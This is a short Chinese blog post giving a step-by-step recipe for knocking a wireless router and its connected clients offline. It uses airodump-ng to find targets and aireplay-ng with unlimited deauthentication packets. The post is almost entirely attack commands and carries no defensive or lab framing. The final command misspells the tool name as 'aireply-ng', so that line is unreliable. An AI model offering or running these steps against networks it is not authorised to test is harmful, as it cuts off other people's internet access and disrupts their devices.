---
title: 对无线路由发起DoS攻击
date: 2024-01-26 22:31:41
tags: 无线网络安全
mathjax: true
---

# 对无线路由发起DoS攻击

先断开连接，查看附近所有WiFi：

```bash
airodump-ng wlan0
```

记录目标MAC地址，尝试攻击，“-0 0”表示无限次数攻击：

```bash
aireplay-ng -0 0 -a MAC地址 wlan0
```

很有可能本机与目标路由不在同一信道，尝试更改信道：

```bash
iwconfig wlan0 channel 目标信道
```

以上流程适用于攻击该无线路由，以下方法为针对目标终端。

查看都有哪些终端连接到该无线路由：

```bash
airodump-ng --bssid 无线路由MAC地址 wlan0
```

嗅探到目标终端的MAC地址后，再次确认是否在同一信道，尝试进行攻击：

```bash
aireply-ng -0 0 -a 无线路由MAC地址 -c 目标终端MAC地址 wlan0
```
